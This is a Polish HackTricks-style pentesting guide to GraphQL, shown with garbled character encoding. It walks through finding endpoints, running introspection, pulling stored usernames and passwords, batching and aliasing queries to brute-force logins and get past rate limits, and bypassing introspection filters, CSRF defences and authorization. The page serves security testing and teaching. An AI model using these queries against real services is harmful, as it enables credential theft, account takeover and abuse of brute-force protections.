# GraphQL

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wprowadzenie

GraphQL jest **wyrÃ³Å¼niany** jako **efektywna alternatywa** dla interfejsu REST API, oferujÄ…c uproszczone podejÅ›cie do pobierania danych z backendu. W przeciwieÅ„stwie do REST, ktÃ³ry czÄ™sto wymaga wielu Å¼Ä…daÅ„ do rÃ³Å¼nych punktÃ³w koÅ„cowych w celu zebrania danych, GraphQL umoÅ¼liwia pobranie wszystkich wymaganych informacji za pomocÄ… **jednego Å¼Ä…dania**. To uproszczenie znacznie **uÅ‚atwia programistom** proces pobierania danych.

## GraphQL i bezpieczeÅ„stwo

Wraz z pojawieniem siÄ™ nowych technologii, w tym GraphQL, pojawiajÄ… siÄ™ rÃ³wnieÅ¼ nowe podatnoÅ›ci bezpieczeÅ„stwa. WaÅ¼nym punktem do zauwaÅ¼enia jest to, Å¼e **GraphQL nie zawiera domyÅ›lnie mechanizmÃ³w uwierzytelniania**. OdpowiedzialnoÅ›Ä‡ za wdroÅ¼enie takich Å›rodkÃ³w bezpieczeÅ„stwa spoczywa na programistach. Bez odpowiedniego uwierzytelnienia punkty koÅ„cowe GraphQL mogÄ… ujawniaÄ‡ poufne informacje nieuwierzytelnionym uÅ¼ytkownikom, stwarzajÄ…c znaczne ryzyko bezpieczeÅ„stwa.

### Ataki siÅ‚owe na katalogi i GraphQL

Aby zidentyfikowaÄ‡ wystawione instancje GraphQL, zaleca siÄ™ uwzglÄ™dnienie okreÅ›lonych Å›cieÅ¼ek w atakach siÅ‚owych na katalogi. SÄ… to Å›cieÅ¼ki:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Zidentyfikowanie otwartych instancji GraphQL umoÅ¼liwia zbadanie obsÅ‚ugiwanych zapytaÅ„. Jest to kluczowe dla zrozumienia danych dostÄ™pnych za poÅ›rednictwem punktu koÅ„cowego. System introspekcji GraphQL uÅ‚atwia to, podajÄ…c szczegÃ³Å‚y dotyczÄ…ce obsÅ‚ugiwanych zapytaÅ„ schematu. Aby uzyskaÄ‡ wiÄ™cej informacji na ten temat, odwoÅ‚aj siÄ™ do dokumentacji GraphQL na temat introspekcji: [**GraphQL: JÄ™zyk zapytaÅ„ dla interfejsÃ³w API.**](https://graphql.org/learn/introspection/)

### Odcisk palca

NarzÄ™dzie [**graphw00f**](https://github.com/dolevf/graphw00f) jest w stanie wykryÄ‡, jakie silniki GraphQL sÄ… uÅ¼ywane na serwerze, a nastÄ™pnie wyÅ›wietla niektÃ³re pomocne informacje dla audytora bezpieczeÅ„stwa.

#### Uniwersalne zapytania <a href="#universal-queries" id="universal-queries"></a>

Aby sprawdziÄ‡, czy dany URL jest usÅ‚ugÄ… GraphQL, moÅ¼na wysÅ‚aÄ‡ **uniwersalne zapytanie**, `query{__typename}`. JeÅ›li odpowiedÅº zawiera `{"data": {"__typename": "Query"}}`, potwierdza to, Å¼e URL hostuje punkt koÅ„cowy GraphQL. Ta metoda opiera siÄ™ na polu `__typename` GraphQL, ktÃ³re ujawnia typ zapytanego obiektu.
```javascript
query{__typename}
```
### Podstawowe wyliczanie

Graphql zazwyczaj obsÅ‚uguje metody **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). ChociaÅ¼ w celu zwiÄ™kszenia bezpieczeÅ„stwa zaleca siÄ™ zezwalaÄ‡ tylko na json, aby zapobiec atakom CSRF.

#### Introspekcja

Aby uÅ¼yÄ‡ introspekcji do odkrywania informacji o schemacie, zapytaj pole `__schema`. To pole jest dostÄ™pne w gÅ‚Ã³wnym typie wszystkich zapytaÅ„.
```bash
query={__schema{types{name,fields{name}}}}
```
Za pomocÄ… tego zapytania znajdziesz nazwÄ™ wszystkich uÅ¼ywanych typÃ³w:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Za pomocÄ… tego zapytania moÅ¼esz wyodrÄ™bniÄ‡ wszystkie typy, ich pola i argumenty (oraz typ argumentÃ³w). BÄ™dzie to bardzo przydatne do poznania sposobu zapytywania bazy danych.

![](<../../.gitbook/assets/image (207) (3).png>)

**BÅ‚Ä™dy**

Warto wiedzieÄ‡, czy **bÅ‚Ä™dy** bÄ™dÄ… **wyÅ›wietlane**, poniewaÅ¼ przyczyniÄ… siÄ™ one do dostarczenia przydatnych **informacji**.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**Wylicz schemat bazy danych za pomocÄ… introspekcji**

{% hint style="info" %}
JeÅ›li introspekcja jest wÅ‚Ä…czona, ale powyÅ¼sze zapytanie nie dziaÅ‚a, sprÃ³buj usunÄ…Ä‡ dyrektywy `onOperation`, `onFragment` i `onField` z struktury zapytania.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Zapytanie o introspekcjÄ™ w linii:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Ostatnia linia kodu to zapytanie graphql, ktÃ³re wyÅ›wietli wszystkie metadane z graphql (nazwy obiektÃ³w, parametry, typy...)

![](<../../.gitbook/assets/image (206).png>)

JeÅ›li introspekcja jest wÅ‚Ä…czona, moÅ¼esz uÅ¼yÄ‡ [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager), aby wyÅ›wietliÄ‡ w GUI wszystkie opcje.

### Zapytanie

Teraz, gdy wiemy, jakie informacje sÄ… przechowywane w bazie danych, sprÃ³bujmy **wydobyÄ‡ niektÃ³re wartoÅ›ci**.

W introspekcji moÅ¼esz znaleÅºÄ‡ **ktÃ³ry obiekt moÅ¼esz bezpoÅ›rednio zapytaÄ‡** (poniewaÅ¼ nie moÅ¼esz zapytaÄ‡ obiektu tylko dlatego, Å¼e istnieje). Na poniÅ¼szym obrazku moÅ¼esz zobaczyÄ‡, Å¼e "_queryType_" nazywa siÄ™ "_Query_" i Å¼e jednym z pÃ³l obiektu "_Query_" jest "_flags_", ktÃ³ry rÃ³wnieÅ¼ jest typem obiektu. Dlatego moÅ¼esz zapytaÄ‡ obiekt flagi.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

ZauwaÅ¼, Å¼e typ zapytania "_flags_" to "_Flags_", a ten obiekt jest zdefiniowany jak poniÅ¼ej:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

MoÅ¼esz zobaczyÄ‡, Å¼e obiekty "_Flags_" skÅ‚adajÄ… siÄ™ z **nazwy** i **wartoÅ›ci**. NastÄ™pnie moÅ¼esz uzyskaÄ‡ wszystkie nazwy i wartoÅ›ci flag za pomocÄ… zapytania:
```javascript
query={flags{name, value}}
```
ZauwaÅ¼, Å¼e w przypadku, gdy **obiekt do zapytania** jest **typem prostym** jak **string** jak w poniÅ¼szym przykÅ‚adzie

![](<../../.gitbook/assets/image (441).png>)

MoÅ¼esz go po prostu zapytaÄ‡:
```javascript
query={hiddenFlags}
```
W innym przykÅ‚adzie, gdzie w obiekcie typu "_Query_" byÅ‚y 2 obiekty: "_user_" i "_users_".\
JeÅ›li te obiekty nie wymagajÄ… Å¼adnego argumentu do wyszukiwania, moÅ¼na **pobraÄ‡ wszystkie informacje z nich**, po prostu **pytajÄ…c** o dane, ktÃ³rych potrzebujesz. W tym przykÅ‚adzie z Internetu moÅ¼na wydobyÄ‡ zapisane nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:

![](<../../.gitbook/assets/image (208).png>)

Jednak w tym przykÅ‚adzie, jeÅ›li sprÃ³bujesz to zrobiÄ‡, otrzymasz ten **bÅ‚Ä…d**:

![](<../../.gitbook/assets/image (210).png>)

WyglÄ…da na to, Å¼e w jakiÅ› sposÃ³b bÄ™dzie wyszukiwaÄ‡ uÅ¼ywajÄ…c argumentu "_**uid**_" typu _**Int**_.\
W kaÅ¼dym razie juÅ¼ to wiedzieliÅ›my, w sekcji [Podstawowe wyliczanie](graphql.md#basic-enumeration) zaproponowano zapytanie, ktÃ³re pokazywaÅ‚o nam wszystkie potrzebne informacje: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

JeÅ›li przeczytasz dostarczone zdjÄ™cie, gdy wykonujÄ™ to zapytanie, zobaczysz, Å¼e "_**user**_" miaÅ‚ argument "_**uid**_" typu _Int_.

WiÄ™c, wykonujÄ…c lekkie bruteforce _**uid**_, odkryÅ‚em, Å¼e dla _**uid**=**1**_ zostaÅ‚a pobrana nazwa uÅ¼ytkownika i hasÅ‚o:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

ZauwaÅ¼, Å¼e **odkryÅ‚em**, Å¼e mogÄ™ pytaÄ‡ o parametry "_**user**_" i "_**password**_", poniewaÅ¼ jeÅ›li sprÃ³bujÄ™ znaleÅºÄ‡ coÅ›, czego nie ma (`query={user(uid:1){noExists}}`), otrzymujÄ™ ten bÅ‚Ä…d:

![](<../../.gitbook/assets/image (213).png>)

I podczas fazy **wyliczania** odkryÅ‚em, Å¼e obiekt "_**dbuser**_" miaÅ‚ pola "_**user**_" i "_**password**_.

**Sztuczka z zrzutem ciÄ…gu zapytaÅ„ (dziÄ™ki @BinaryShadow\_)**

JeÅ›li moÅ¼esz wyszukiwaÄ‡ wedÅ‚ug typu ciÄ…gu, na przykÅ‚ad: `query={theusers(description: ""){username,password}}` i **szukasz pustego ciÄ…gu**, to **wyrzuci wszystkie dane**. (_ZauwaÅ¼, Å¼e ten przykÅ‚ad nie jest zwiÄ…zany z przykÅ‚adem z samouczkÃ³w, dla tego przykÅ‚adu zakÅ‚adamy, Å¼e moÅ¼esz wyszukiwaÄ‡ za pomocÄ… "**theusers**" wedÅ‚ug pola typu ciÄ…gu o nazwie "**description**"_).

### Wyszukiwanie

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** sÄ… identyfikowane przez swoje **adresy e-mail** i **imiÄ™**; **filmy** przez swoje **nazwy** i **ocenÄ™**. **Osoby** mogÄ… byÄ‡ zaprzyjaÅºnione miÄ™dzy sobÄ… i rÃ³wnieÅ¼ mieÄ‡ filmy, co wskazuje na relacje w bazie danych.

MoÅ¼esz **wyszukiwaÄ‡** osoby **wedÅ‚ug** imienia i otrzymaÄ‡ ich adresy e-mail:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
MoÅ¼esz **wyszukiwaÄ‡** osoby **po** imieniu i otrzymaÄ‡ informacje o ich **subskrybowanych** **filmach**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
ZauwaÅ¼, Å¼e wskazano na pobranie `name` z `subscribedMovies` osoby.

MoÅ¼esz rÃ³wnieÅ¼ **wyszukiwaÄ‡ wiele obiektÃ³w jednoczeÅ›nie**. W tym przypadku wyszukiwane sÄ… 2 filmy:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Lub nawet **relacje kilku rÃ³Å¼nych obiektÃ³w za pomocÄ… aliasÃ³w**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacje

**Mutacje sÅ‚uÅ¼Ä… do wprowadzania zmian po stronie serwera.**

W **introspekcji** moÅ¼na znaleÅºÄ‡ **zadeklarowane mutacje**. Na poniÅ¼szym obrazku "_MutationType_" jest nazywane "_Mutation_", a obiekt "_Mutation_" zawiera nazwy mutacji (jak "_addPerson_" w tym przypadku):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** sÄ… identyfikowane przez swoje **adresy e-mail** i **imiÄ™**, a **filmy** przez swoje **nazwy** i **oceny**. **Osoby** mogÄ… byÄ‡ ze sobÄ… zaprzyjaÅºnione i mieÄ‡ filmy, co wskazuje na relacje w bazie danych.

Mutacja do **tworzenia nowych** filmÃ³w w bazie danych moÅ¼e wyglÄ…daÄ‡ jak poniÅ¼sza (w tym przykÅ‚adzie mutacja nazywa siÄ™ `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**ZauwaÅ¼, Å¼e zarÃ³wno wartoÅ›ci, jak i typ danych sÄ… wskazane w zapytaniu.**

Dodatkowo, baza danych obsÅ‚uguje operacjÄ™ **mutacji** o nazwie `addPerson`, ktÃ³ra umoÅ¼liwia tworzenie **osÃ³b** wraz z ich powiÄ…zaniami z istniejÄ…cymi **przyjaciÃ³Å‚mi** i **filmami**. WaÅ¼ne jest zauwaÅ¼enie, Å¼e przyjaciele i filmy muszÄ… istnieÄ‡ w bazie danych przed ich powiÄ…zaniem z nowo utworzonÄ… osobÄ….
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Wykonywanie ataku brute-force w jednym Å¼Ä…daniu API

Ta informacja zostaÅ‚a zaczerpniÄ™ta z [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autoryzacja za pomocÄ… interfejsu API GraphQL z **rÃ³wnoczesnym wysyÅ‚aniem wielu zapytaÅ„ z rÃ³Å¼nymi danymi uwierzytelniajÄ…cymi** w celu ich sprawdzenia. To klasyczny atak brute-force, ale teraz moÅ¼liwe jest wysÅ‚anie wiÄ™cej niÅ¼ jednej pary login/hasÅ‚o w jednym Å¼Ä…daniu HTTP dziÄ™ki funkcji grupowania GraphQL. Taka metoda wprowadziÅ‚aby w bÅ‚Ä…d zewnÄ™trzne aplikacje monitorujÄ…ce tempo, ktÃ³re myÅ›laÅ‚yby, Å¼e wszystko jest w porzÄ…dku i nie ma Å¼adnego botu prÃ³bujÄ…cego zgadywaÄ‡ hasÅ‚a.

PoniÅ¼ej znajduje siÄ™ najprostsza demonstracja Å¼Ä…dania uwierzytelniajÄ…cego aplikacji, z **trzema rÃ³Å¼nymi parami email/hasÅ‚o na raz**. OczywiÅ›cie moÅ¼na wysÅ‚aÄ‡ tysiÄ…ce w jednym Å¼Ä…daniu w ten sam sposÃ³b:

![](<../../.gitbook/assets/image (182) (1).png>)

Jak widaÄ‡ na zrzucie ekranu odpowiedzi, pierwsze i trzecie Å¼Ä…dania zwrÃ³ciÅ‚y _null_ i odzwierciedliÅ‚y odpowiednie informacje w sekcji _error_. **Druga mutacja zawieraÅ‚a poprawne dane uwierzytelniajÄ…ce** i odpowiedÅº zawieraÅ‚a poprawny token sesji uwierzytelniajÄ…cej.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL bez introspekcji

Coraz wiÄ™cej **punktÃ³w koÅ„cowych GraphQL wyÅ‚Ä…cza introspekcjÄ™**. Jednak bÅ‚Ä™dy, ktÃ³re GraphQL zwraca, gdy otrzymuje nieoczekane Å¼Ä…danie, sÄ… wystarczajÄ…ce dla narzÄ™dzi takich jak [**clairvoyance**](https://github.com/nikitastupin/clairvoyance), aby odtworzyÄ‡ wiÄ™kszoÅ›Ä‡ schematu.

Ponadto, rozszerzenie Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **obserwuje Å¼Ä…dania API GraphQL przechodzÄ…ce przez Burp** i **buduje** wewnÄ™trzny **schemat GraphQL** dla kaÅ¼dego nowego zapytania, ktÃ³re widzi. MoÅ¼e rÃ³wnieÅ¼ ujawniÄ‡ schemat dla GraphiQL i Voyager. Rozszerzenie zwraca faÅ‚szywÄ… odpowiedÅº, gdy otrzymuje zapytanie introspekcji. W rezultacie GraphQuail pokazuje wszystkie zapytania, argumenty i pola dostÄ™pne do uÅ¼ycia w ramach interfejsu API. WiÄ™cej informacji moÅ¼na znaleÅºÄ‡ [**tutaj**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Åadna **lista sÅ‚Ã³w** do odkrywania [**encji GraphQL moÅ¼na znaleÅºÄ‡ tutaj**](https://github.com/Escape-Technologies/graphql-wordlist?).

### OminiÄ™cie obrony przed introspekcjÄ… GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **OminiÄ™cie obrony przed introspekcjÄ… GraphQL**

Aby ominÄ…Ä‡ ograniczenia dotyczÄ…ce zapytaÅ„ introspekcyjnych w interfejsach API, skutecznym jest wstawienie **specjalnego znaku po sÅ‚owie kluczowym `__schema`**. Ta metoda wykorzystuje powszechne niedopatrzenia programistÃ³w w wyraÅ¼eniach regularnych, ktÃ³re majÄ… na celu blokowanie introspekcji, skupiajÄ…c siÄ™ na sÅ‚owie kluczowym `__schema`. DodajÄ…c znaki takie jak **spacje, nowe linie i przecinki**, ktÃ³re GraphQL ignoruje, ale mogÄ… nie byÄ‡ uwzglÄ™dnione w wyraÅ¼eniach regularnych, moÅ¼na ominÄ…Ä‡ ograniczenia. Na przykÅ‚ad, zapytanie introspekcyjne z nowÄ… liniÄ… po `__schema` moÅ¼e ominÄ…Ä‡ takÄ… obronÄ™:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
JeÅ›li nie uda siÄ™, rozwaÅ¼ alternatywne metody Å¼Ä…dania, takie jak Å¼Ä…dania **GET** lub **POST z `x-www-form-urlencoded`**, poniewaÅ¼ ograniczenia mogÄ… dotyczyÄ‡ tylko Å¼Ä…daÅ„ POST.

### **Odkrywanie ujawnionych struktur GraphQL**

Kiedy introspekcja jest wyÅ‚Ä…czona, badanie kodu ÅºrÃ³dÅ‚owego strony internetowej w poszukiwaniu wczytanych zapytaÅ„ w bibliotekach JavaScript jest przydatnÄ… strategiÄ…. Te zapytania moÅ¼na znaleÅºÄ‡ za pomocÄ… zakÅ‚adki `Sources` w narzÄ™dziach dla programistÃ³w, co pozwala uzyskaÄ‡ wglÄ…d w schemat API i ujawniÄ‡ potencjalnie **ujawnione wraÅ¼liwe zapytania**. Polecenia do wyszukiwania w narzÄ™dziach dla programistÃ³w to:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF w GraphQL

JeÅ›li nie wiesz, czym jest CSRF, przeczytaj nastÄ™pujÄ…cÄ… stronÄ™:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Tam bÄ™dziesz mÃ³gÅ‚ znaleÅºÄ‡ kilka punktÃ³w koÅ„cowych GraphQL **skonfigurowanych bez tokenÃ³w CSRF.**

ZauwaÅ¼, Å¼e Å¼Ä…dania GraphQL sÄ… zazwyczaj wysyÅ‚ane za pomocÄ… Å¼Ä…daÅ„ POST przy uÅ¼yciu nagÅ‚Ã³wka Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Jednak wiÄ™kszoÅ›Ä‡ punktÃ³w koÅ„cowych GraphQL obsÅ‚uguje rÃ³wnieÅ¼ Å¼Ä…dania POST w formacie **`form-urlencoded`**:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Dlatego, poniewaÅ¼ Å¼Ä…dania CSRF takie jak poprzednie sÄ… wysyÅ‚ane **bez Å¼Ä…daÅ„ preflight**, moÅ¼liwe jest **wykonanie** **zmian** w GraphQL, naduÅ¼ywajÄ…c CSRF.

NaleÅ¼y jednak zauwaÅ¼yÄ‡, Å¼e nowa domyÅ›lna wartoÅ›Ä‡ ciasteczka `samesite` w przeglÄ…darce Chrome to `Lax`. Oznacza to, Å¼e ciasteczko bÄ™dzie wysyÅ‚ane tylko z witryny zewnÄ™trznej w Å¼Ä…daniach GET.

NaleÅ¼y rÃ³wnieÅ¼ zauwaÅ¼yÄ‡, Å¼e zazwyczaj moÅ¼liwe jest wysÅ‚anie **Å¼Ä…dania zapytania** rÃ³wnieÅ¼ jako **Å¼Ä…danie GET**, a token CSRF moÅ¼e nie byÄ‡ sprawdzany w Å¼Ä…daniu GET.

Dodatkowo, naduÅ¼ywajÄ…c [**ataku XS-Search**](../../pentesting-web/xs-search.md), moÅ¼liwe jest wydobywanie zawartoÅ›ci z punktu koÅ„cowego GraphQL, naduÅ¼ywajÄ…c poÅ›wiadczeÅ„ uÅ¼ytkownika.

Aby uzyskaÄ‡ wiÄ™cej informacji, **sprawdÅº** [**oryginalny post tutaj**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autoryzacja w GraphQL

Wiele funkcji GraphQL zdefiniowanych na punkcie koÅ„cowym moÅ¼e sprawdzaÄ‡ tylko uwierzytelnienie Å¼Ä…dajÄ…cego, ale nie autoryzacjÄ™.

Modyfikowanie zmiennych wejÅ›ciowych zapytania moÅ¼e prowadziÄ‡ do **wycieku** wraÅ¼liwych danych konta [leaked](https://hackerone.com/reports/792927).

Mutacja moÅ¼e nawet prowadziÄ‡ do przejÄ™cia konta, prÃ³bujÄ…c zmodyfikowaÄ‡ dane innego konta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### OminiÄ™cie autoryzacji w GraphQL

[ÅÄ…czenie zapytaÅ„](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) moÅ¼e obejÅ›Ä‡ sÅ‚aby system uwierzytelniania.

W poniÅ¼szym przykÅ‚adzie moÅ¼na zobaczyÄ‡, Å¼e operacja to "forgotPassword" i powinna ona wykonywaÄ‡ tylko zwiÄ…zane z niÄ… zapytanie forgotPassword. MoÅ¼na to obejÅ›Ä‡, dodajÄ…c zapytanie na koÅ„cu, w tym przypadku dodajemy "register" i zmiennÄ… uÅ¼ytkownika, aby system zarejestrowaÅ‚ nowego uÅ¼ytkownika.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## OminiÄ™cie limitÃ³w szybkoÅ›ci za pomocÄ… aliasÃ³w w GraphQL

W GraphQL aliasy sÄ… potÄ™Å¼nÄ… funkcjÄ…, ktÃ³ra umoÅ¼liwia **eksplikacyjne nazwanie wÅ‚aÅ›ciwoÅ›ci** podczas wykonywania Å¼Ä…dania API. Ta funkcjonalnoÅ›Ä‡ jest szczegÃ³lnie przydatna do pobierania **wielu instancji tego samego typu** obiektu w jednym Å¼Ä…daniu. Aliasy mogÄ… byÄ‡ wykorzystane do pokonania ograniczenia, ktÃ³re uniemoÅ¼liwia obiektom GraphQL posiadanie wielu wÅ‚aÅ›ciwoÅ›ci o tej samej nazwie.

Aby dokÅ‚adnie zrozumieÄ‡ aliasy w GraphQL, zaleca siÄ™ skorzystanie z nastÄ™pujÄ…cego ÅºrÃ³dÅ‚a: [Aliasy](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Podstawowym celem aliasÃ³w jest zmniejszenie koniecznoÅ›ci wykonywania licznych wywoÅ‚aÅ„ API, ale zidentyfikowano niezamierzone zastosowanie, w ktÃ³rym aliasy mogÄ… byÄ‡ wykorzystane do przeprowadzania atakÃ³w brute force na punkt koÅ„cowy GraphQL. Jest to moÅ¼liwe, poniewaÅ¼ niektÃ³re punkty koÅ„cowe sÄ… chronione przez limity szybkoÅ›ci zaprojektowane w celu uniemoÅ¼liwienia atakÃ³w brute force poprzez ograniczenie **liczby Å¼Ä…daÅ„ HTTP**. Jednak te limity szybkoÅ›ci mogÄ… nie uwzglÄ™dniaÄ‡ liczby operacji w kaÅ¼dym Å¼Ä…daniu. PoniewaÅ¼ aliasy pozwalajÄ… na doÅ‚Ä…czanie wielu zapytaÅ„ w jednym Å¼Ä…daniu HTTP, mogÄ… one obejÅ›Ä‡ takie ograniczenia limitowania szybkoÅ›ci.

Przyjrzyjmy siÄ™ poniÅ¼szemu przykÅ‚adowi, ktÃ³ry ilustruje, jak zapytania z aliasami mogÄ… byÄ‡ uÅ¼ywane do weryfikacji poprawnoÅ›ci kodÃ³w rabatowych w sklepie. Ta metoda moÅ¼e obejÅ›Ä‡ limity szybkoÅ›ci, poniewaÅ¼ kompiluje kilka zapytaÅ„ w jedno Å¼Ä…danie HTTP, co potencjalnie pozwala na weryfikacjÄ™ licznych kodÃ³w rabatowych jednoczeÅ›nie.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## NarzÄ™dzia

### Skanery podatnoÅ›ci

